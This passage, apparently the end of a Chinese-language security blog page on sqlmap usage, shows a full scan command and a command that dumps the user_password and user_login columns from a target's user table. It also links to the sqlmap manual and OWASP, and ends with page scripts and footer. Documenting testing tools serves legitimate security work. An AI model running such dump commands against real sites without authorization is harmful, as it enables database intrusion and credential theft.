+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -v <span style="color:#ae81ff">2</span> --url<span style="color:#f92672">=</span>http://mysite.com/index --user-agent<span style="color:#f92672">=</span>SQLMAP --delay<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> --timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">15</span> --retries<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> --keep-alive --threads<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --eta --batch --dbms<span style="color:#f92672">=</span>MySQL --os<span style="color:#f92672">=</span>Linux --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> --banner --is-dba --dbs --tables --technique<span style="color:#f92672">=</span>BEUST -s /tmp/scan_report.txt --flush-session -t /tmp/scan_trace.txt --fresh-queries
+</code></pre></div><h3 id="导出相关内容">导出相关内容</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u http://www.sqldummywebsite.com/cgi-bin/item.cgi?item_id<span style="color:#f92672">=</span><span style="color:#ae81ff">15</span> -D sqldummywebsite -T user_info -C user_password,user_login --dump
+</code></pre></div><h3 id="清除session-重新扫描">清除session, 重新扫描</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u 目标 --flush-session --fresh-queries
+</code></pre></div><h2 id="0x03-附录">0x03 附录</h2>
+<ol>
+<li><a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">SQLmap官方使用手册英文</a></li>
+<li><a href="http://www.vuln.cn/2035">SQLmap用户手册详解【实用版】</a></li>
+<li><a href="https://www.owasp.org/index.php/Automated_Audit_using_SQLMap">OWASP基于SQLmap的自动化审计</a></li>
+</ol>
+
+
+			
+
+			
+				<div class="tags-list">
+					<span class="dark-red">标签</span><span class="decorative-marker">//</span>
+					
+	                <a class="post-tag post-tag-%E5%AE%89%E5%85%A8" href="https://vul-hunters.gitee.io/hunter-blogs//tags/%E5%AE%89%E5%85%A8">安全</a>,
+	                
+	                <a class="post-tag post-tag-sqlmap" href="https://vul-hunters.gitee.io/hunter-blogs//tags/sqlmap">SQLmap</a>,
+	                
+				</div>
+			
+
+			
+				<div class="paging">
+					<span class="paging-label">更多</span>
+					
+					<div class="paging-newer">
+						<span class="dark-red">下一篇</span><span class="decorative-marker">//</span>
+						<a class="paging-link" href="/hunter-blogs/posts/sec-tools-nmap/">安全工具 - nmap用法</a>
+		            </div>
+		            
+
+					
+					<div class="paging-older">
+						<span class="dark-red">上一篇</span><span class="decorative-marker">//</span>
+			            <a class="paging-link" href="/hunter-blogs/posts/vul-csrf-src-1/">【漏洞公告】某平台一个有意思的CSRF</a>
+		            </div>
+		            
+	            </div>
+            
+          </section>
+          
+					
+						<div id="SOHUCS" sid="debfcf6a93df506983e2b72a70148938" ></div>
+						<script type="text/javascript">
+						(function(){
+						var appid = 'cyt2WbpnE';
+						var conf = 'prod_1483c999ca226afb821c066b009731f0';
+						var width = window.innerWidth || document.documentElement.clientWidth;
+						if (width < 960) {
+							window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("https://changyan.sohu.com/upload/changyan.js",function(){window.changyan.api.config({appid:appid,conf:conf})}); } })(); </script>
+          
+
+      <script>
+    var _mtac = {"senseQuery":1};
+    (function() {
+        var mta = document.createElement("script");
+        mta.src = "//pingjs.qq.com/h5/stats.js?v2.0.4";
+        mta.setAttribute("name", "MTAH5");
+        mta.setAttribute("sid", "500423548");
+        mta.setAttribute("cid", "500423556");
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(mta, s);
+    })();
+</script>
+<div class="footer">
+	<hr class="thin" />
+	<div class="pure-menu pure-menu-horizontal pure-menu-open">
+		<ul class="footer-menu">
+		
+		</ul>
+	</div>
+
+    <p><a id="beian" target="_blank" href="https://beian.miit.gov.cn/">粤ICP备15077600号</a> </p>
+    <script src="https://vul-hunters.gitee.io/hunter-blogs/js/beian.js"></script>
+</div>
+
+    </div>
+  </div>
+	
+
+	
+  
+</body>
+</html>
